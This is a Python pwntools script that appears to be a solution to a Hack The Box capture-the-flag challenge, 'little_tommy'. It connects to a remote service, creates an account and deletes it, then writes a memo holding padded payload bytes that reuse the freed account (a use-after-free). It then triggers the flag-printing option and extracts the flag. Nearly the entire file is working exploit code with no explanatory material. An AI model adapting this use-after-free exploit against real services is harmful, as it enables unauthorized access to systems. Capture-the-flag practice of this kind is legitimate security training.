from sys import argv

from pwn import *

host = argv[1]
port = int(argv[2])
elf = ELF("little_tommy")
p = remote(host, port)
arch = 'i386'

create_account = '1'
first_name = 'aaaa'
last_name = 'bbbb'
delete_account = '3'
memo = '4'
add_memo = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPfuck'  # payload
cat_flag = '5'

p.recvuntil('Please enter an operation number:')
sleep(0.5)
p.sendline(create_account)
sleep(0.5)
p.sendlineafter("First name:", first_name)
sleep(0.5)
p.recvuntil('Last name:')
p.sendline(last_name)
sleep(0.5)
p.recvuntil('Please enter an operation number:')
p.sendline(delete_account)
p.recvuntil('Account deleted successfully')
sleep(0.5)
p.recvuntil('Please enter an operation number:')
p.sendline(memo)
sleep(0.5)
p.recvuntil('Please enter memo:')
p.sendline(add_memo)
p.recvuntil('Thank you, please keep this reference number number safe:')
sleep(0.5)
p.recvuntil('Please enter an operation number: ')
p.sendline(cat_flag)
p.recvuntil("HTB")
log.success("flag --> HTB%s" % p.recvline().strip().decode())
p.close()
